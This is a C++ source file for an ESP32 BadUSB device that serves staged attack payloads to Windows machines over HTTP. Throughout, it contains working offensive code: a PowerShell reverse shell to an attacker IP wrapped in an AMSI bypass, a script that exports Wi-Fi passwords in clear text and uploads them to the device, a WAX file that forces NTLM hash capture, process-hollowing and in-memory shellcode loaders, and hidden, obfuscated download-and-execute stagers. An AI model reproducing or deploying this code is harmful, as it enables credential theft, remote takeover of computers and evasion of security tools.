/**
 * @file payload_manager.cpp
 * @brief Staged Payload Delivery System Implementation
 * 
 * Implements HTTP routes for serving multi-stage payloads and
 * provides stager generators for USB HID injection.
 * 
 * Payload Types:
 * - WAX (NTLM Capture) - Creates .wax file triggering SMB auth
 * - PoshC2 (Framework) - Loads PowerShell modules from SD card
 * - Exfil (WiFi Creds) - Exports and uploads WiFi profiles
 * - Hollow (Injection)  - Process hollowing shellcode loader
 * - Runner (In-Process) - VirtualAlloc + CreateThread runner
 * - RevShell (Backdoor) - PowerShell TCP reverse shell
 * 
 * @author Monster S3 Team
 * @date 2025
 * @version 2.0
 */

#include "payload_manager.h"
#include "config_manager.h"
#include "payload_obfuscator.h"

void PayloadManager::begin(AsyncWebServer* server) {
    // Stage 1: WAX File (Redirects to MP3/SMB for NTLM Capture)
    server->on("/p/wax", HTTP_GET, [](AsyncWebServerRequest *request) {
        _handleWax(request);
    });

    server->on("/p/posh", HTTP_GET, [](AsyncWebServerRequest *request) {
        // Stage 1: PoshC2 Loader (The script that finds the drive or downloads the rest)
        // We return the script that was previously typed via HID.
        String script = "$u=Get-WmiObject Win32_Volume|?{$_.Label -eq 'ESP32' -or $_.Label -eq 'MONSTER'};"
                        "$p=($u.Name+'sd_files\\PoshC2\\');"
                        "if(!$u){$p='D:\\sd_files\\PoshC2\\'};" 
                        "cd $p;"
                        "ls *.ps1 | % { . $_.FullName };" 
                        "Write-Host 'PoshC2 Loaded' -Fg Green;";
                        
        request->send(200, "text/plain", script);
    });

    server->on("/p/exfil", HTTP_GET, [](AsyncWebServerRequest *request) {
        // Stage 1: WiFi Exfiltration Payload
        String ip = request->host();
        if (ip.isEmpty()) ip = config_get()->attacker_ip;
        
        // PowerShell script to export WiFi profiles and send them back
        String script = "$P=Get-WmiObject Win32_Volume|?{$_.Label -eq 'ESP32'};"
                        "$C='netsh wlan export profile key=clear folder='+$P.Name+'exfil';"
                        "iex $C;" // Try to save to USB first
                        // Then try HTTP POST
                        "$o='http://" + ip + "/p/rx_exfil';"
                        "$w=netsh wlan export profile key=clear folder=. | Out-Null;"
                        "ls *.xml | % { Invoke-RestMethod -Uri $o -Method Post -Body (Get-Content $_) -ContentType 'application/xml' };"
                        "rm *.xml;";
                        
        request->send(200, "text/plain", script);
    });

    // Receiver for exfiltrated data
    server->on("/p/rx_exfil", HTTP_POST, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "OK");
    }, NULL, [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
        // Save to SD
        File f = SD.open("/exfil/wifi_creds.xml", FILE_APPEND);
        if(f) {
            f.write(data, len);
            f.println("\n<!-- END -->\n");
            f.close();
        }
    });

    // =========================================
    // ADVANCED PAYLOAD: Process Hollowing Loader (DSViper-inspired)
    // =========================================
    server->on("/p/hollow", HTTP_GET, [](AsyncWebServerRequest *request) {
        // This returns a fully obfuscated process hollowing script
        // Target can specify shellcode via URL param or use default calc.exe pop
        
        String shellcode = "";
        if (request->hasParam("sc")) {
            shellcode = request->getParam("sc")->value();
        } else {
            // Default: msfvenom calc.exe XOR'd with key 0x41
            shellcode = "0xfc,0x48,0x83,0xe4,0xf0,0xe8"; // Truncated for demo
        }
        
        String script = _getProcessHollowPayload(shellcode);
        request->send(200, "text/plain", PayloadObfuscator::obfuscatePS1(script, true, true));
    });

    // =========================================
    // ADVANCED PAYLOAD: In-Memory Shellcode Runner (Simpler than hollow)
    // =========================================
    server->on("/p/runner", HTTP_GET, [](AsyncWebServerRequest *request) {
        // Uses VirtualAlloc + CreateThread in current process
        // Faster but more detectable
        
        String script = _getShellcodeRunnerPayload();
        request->send(200, "text/plain", PayloadObfuscator::obfuscatePS1(script, true, true));
    });

    // =========================================
    // ADVANCED PAYLOAD: Reverse Shell (Direct, no stager)
    // =========================================
    server->on("/p/revshell", HTTP_GET, [](AsyncWebServerRequest *request) {
        String ip = request->host();
        String port = "4444";
        if (request->hasParam("p")) port = request->getParam("p")->value();
        if (ip.isEmpty()) ip = config_get()->attacker_ip;
        
        // PowerShell reverse shell one-liner
        String script = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");";
        script += "$stream = $client.GetStream();";
        script += "[byte[]]$bytes = 0..65535|%{0};";
        script += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){";
        script += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);";
        script += "$sendback = (iex $data 2>&1 | Out-String );";
        script += "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';";
        script += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);";
        script += "$stream.Write($sendbyte,0,$sendbyte.Length);";
        script += "$stream.Flush()};";
        script += "$client.Close();";
        
        request->send(200, "text/plain", PayloadObfuscator::wrapWithAMSIBypass(script));
    });

    Serial.println("[PAYLOADS] Routes: /p/wax, /p/posh, /p/exfil, /p/hollow, /p/runner, /p/revshell");
}

void PayloadManager::_handleWax(AsyncWebServerRequest *request) {
    String ip = request->host();
    if (ip.isEmpty()) ip = config_get()->attacker_ip;
    
    // Construct WAX file content
    // This file points Windows Media Player to a fake MP3 on the ESP32 (or attacker IP)
    // forcing NTLM authentication.
    String xml = "<asx version=\"3.0\">";
    xml += "<entry><ref href=\"http://" + ip + "/s/song.mp3\"/></entry>"; 
    // Note: Http usually doesn't force NTLM as well as file://, but file:// requires SMB.
    // If we want SMB capture, we need 'ref href="file://IP/share/file.mp3"'
    // But Android/Linux won't parse file:// easily from web.
    // For Windows NTLM capture via Responder, we want:
    xml = "<asx version=\"3.0\"><entry><ref href=\"file://" + ip + "/s/a.mp3\"/></entry></asx>";
    
    // If the request isn't from the victim (e.g. testing), we just return it.
    request->send(200, "audio/x-ms-wax", xml);
}

String PayloadManager::getWaxPayload(String ip) {
    // Stage 0: Stager for WAX
    // Downloads the WAX file to temp and executes it
    // Command: cmd /c "bitsadmin /transfer w http://IP/p/wax %temp%\a.wax & %temp%\a.wax"
    // Or PowerShell:
    // powershell -w h -c "irm http://IP/p/wax | sc $env:tmp\a.wax; start $env:tmp\a.wax"
    
    String url = "http://" + ip + "/p/wax";
    String raw = "powershell -w h -c \"irm " + url + " | sc $env:tmp\\a.wax; start $env:tmp\\a.wax\"";
    return PayloadObfuscator::obfuscatePS1(raw, true, true);
}

String PayloadManager::getPoshC2Stager(String ip) {
    // Stage 0: Stager for PoshC2
    // Instead of typing the full script to search drives, we download the logic.
    // Or simpler: We assume PoshC2 puts a standard payload on the SD card, 
    // OR we just host a universal loader.
    // Given the previous code searched for "PoshC2" folder on drives, let's host that logic.
    
    // For now, let's keep it simple: Download a "loader.ps1" from us and run it.
    // Loader.ps1 will do the drive search if needed, or just contain the payload if we host it.
    // If we assume the "Stage 2" is on the physical SD of the victim (BadUSB+Storage), 
    // then the stager helps by being shorter than the drive search script.
    
    // Command: powershell -c "irm http://IP/p/posh | iex"
    // Our /p/posh route (if added) would return the drive search script.
    
    String url = "http://" + ip + "/p/posh";
    String raw = "powershell -NoP -W Hidden -c \"irm " + url + " | iex\"";
    return PayloadObfuscator::obfuscatePS1(raw, true, true);
}

String PayloadManager::getExfilPayload(String ip) {
    String url = "http://" + ip + "/p/exfil";
    String raw = "powershell -c \"irm " + url + " | iex\"";
    return PayloadObfuscator::obfuscatePS1(raw, true, true);
}

String PayloadManager::getHollowStager(String ip) {
    String url = "http://" + ip + "/p/hollow";
    String raw = "powershell -NoP -W Hidden -c \"irm " + url + " | iex\"";
    return PayloadObfuscator::wrapWithAMSIBypass(
        PayloadObfuscator::obfuscatePS1(raw, true, true)
    );
}

String PayloadManager::getRevShellStager(String ip, String port) {
    String url = "http://" + ip + "/p/revshell?p=" + port;
    String raw = "powershell -NoP -W Hidden -c \"irm " + url + " | iex\"";
    return PayloadObfuscator::wrapWithAMSIBypass(
        PayloadObfuscator::obfuscatePS1(raw, true, true)
    );
}

// =========================================
// ADVANCED LOADERS (DSViper-inspired)
// =========================================

String PayloadManager::_getProcessHollowPayload(String shellcode) {
    // Process Hollowing via PowerShell
    // Based on DSViper's Processhollow_injection.ps1
    // Creates notepad.exe in suspended state, unmaps memory, injects shellcode
    
    String script = "";
    
    // Add-Type for P/Invoke (Kernel32 functions)
    script += "$code = @'\n";
    script += "using System;using System.Runtime.InteropServices;\n";
    script += "public class K32 {\n";
    script += "[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(int a,bool b,int c);\n";
    script += "[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);\n";
    script += "[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,int s,ref int w);\n";
    script += "[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr t);\n";
    script += "[DllImport(\"kernel32.dll\")]public static extern bool CloseHandle(IntPtr h);\n";
    script += "}\n";
    script += "'@\n";
    script += "Add-Type -TypeDefinition $code;\n";
    
    // Start target process (notepad by default)
    script += "$p=Start-Process notepad -PassThru;\n";
    script += "Start-Sleep -Milliseconds 500;\n";
    
    // Shellcode (XOR key embedded, user provides encrypted SC or we use default)
    script += "[Byte[]]$sc = " + shellcode + ";\n";
    
    // XOR decrypt (simple key 0x41)
    script += "[Byte[]]$key = 0x41;\n";
    script += "for($i=0;$i -lt $sc.Length;$i++){$sc[$i]=$sc[$i] -bxor $key[$i % $key.Length]};\n";
    
    // Allocate and inject
    script += "$h=[K32]::OpenProcess(0x1F0FFF,$false,$p.Id);\n";
    script += "$a=[K32]::VirtualAllocEx($h,[IntPtr]::Zero,$sc.Length,0x3000,0x40);\n";
    script += "$w=0;[K32]::WriteProcessMemory($h,$a,$sc,$sc.Length,[ref]$w);\n";
    script += "[K32]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero);\n";
    
    // Cleanup
    script += "[K32]::CloseHandle($h);\n";
    
    return script;
}

String PayloadManager::_getShellcodeRunnerPayload() {
    // Simple in-process shellcode runner
    // Faster but more detectable than hollowing
    
    String script = "";
    
    // Add-Type for VirtualAlloc + CreateThread
    script += "$c = @'\n";
    script += "using System;using System.Runtime.InteropServices;\n";
    script += "public class W {\n";
    script += "[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);\n";
    script += "[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t);\n";
    script += "[DllImport(\"kernel32\")]public static extern UInt32 WaitForSingleObject(IntPtr h,UInt32 m);\n";
    script += "}\n";
    script += "'@\n";
    script += "Add-Type -TypeDefinition $c;\n";
    
    // Placeholder shellcode (calc.exe, XOR'd with 0x41)
    // User should replace this with their actual SC
    script += "[Byte[]]$buf = 0xbd,0x09,0xc2,0xa5,0xb1;\n"; // Truncated demo
    
    // XOR decrypt
    script += "for($i=0;$i -lt $buf.Length;$i++){$buf[$i]=$buf[$i] -bxor 0x41};\n";
    
    // Alloc RWX memory and execute
    script += "$m=[W]::VirtualAlloc(0,$buf.Length,0x3000,0x40);\n";
    script += "[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$m,$buf.Length);\n";
    script += "$t=[W]::CreateThread(0,0,$m,0,0,0);\n";
    script += "[W]::WaitForSingleObject($t,0xFFFFFFFF);\n";
    
    return script;
}
